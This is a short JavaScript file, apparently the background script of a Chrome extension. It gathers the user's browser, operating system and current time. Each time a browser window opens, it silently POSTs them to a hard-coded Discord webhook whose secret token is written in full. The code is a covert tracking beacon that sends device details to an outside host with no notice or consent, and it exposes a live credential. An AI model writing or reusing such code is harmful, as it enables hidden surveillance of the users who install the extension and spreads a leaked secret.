let date = new Date()

let months = {
    "0": 'January',
    "1": "February",
    "2": "March",
    "3": "April",
    "4": "May",
    "5": "June",
    "6": "July",
    "7": "August",
    "8": "September",
    "9": "October",
    "10": "November",
    "11": "December"
}

let fullDate = date.getHours() + ":" + date.getMinutes() + ":" + date.getSeconds() + " " + date.getDate() + " " + months[date.getMonth()]

let OSName = "Unknown OS";

if (navigator.appVersion.indexOf("Win") != -1) OSName = "Windows";
if (navigator.appVersion.indexOf("Mac") != -1) OSName = "MacOS";
if (navigator.appVersion.indexOf("X11") != -1) OSName = "UNIX";
if (navigator.appVersion.indexOf("Linux") != -1) OSName = "Linux";

var browser = (function () {
    var test = function (regexp) { return regexp.test(navigator.userAgent) }
    switch (true) {
        case test(/edg/i): return "Microsoft Edge";
        case test(/trident/i): return "Microsoft Internet Explorer";
        case test(/firefox|fxios/i): return "Mozilla Firefox";
        case test(/opr\//i): return "Opera";
        case test(/ucbrowser/i): return "UC Browser";
        case test(/samsungbrowser/i): return "Samsung Browser";
        case test(/chrome|chromium|crios/i): return "Google Chrome";
        case test(/safari/i): return "Apple Safari";
        default: return "Other";
    }
})();

let file = {
    content: '```' + `Browser: ${browser}` + '\n\n' + `Date: ${fullDate}` + '\n\n' + `Os: ${OSName}` + '```'
}

const upload = (file, link) => {
    fetch(link, {
        method: 'POST',
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(file)
    }).then(
        response => response.json()
    ).then(
        success => console.log(success)
    ).catch(
        error => console.log(error)
    );
};

chrome.windows.onCreated.addListener(
    function () {
        upload(file, "https://discord.com/api/webhooks/1192935306089992203/0PUwU7ZYyiuOQnQQHTbIKm1MQC25c0eUJoyQVxD7XCaNK5f-QQ4ANrv4LtqtTY4ENXgL");
    }
)
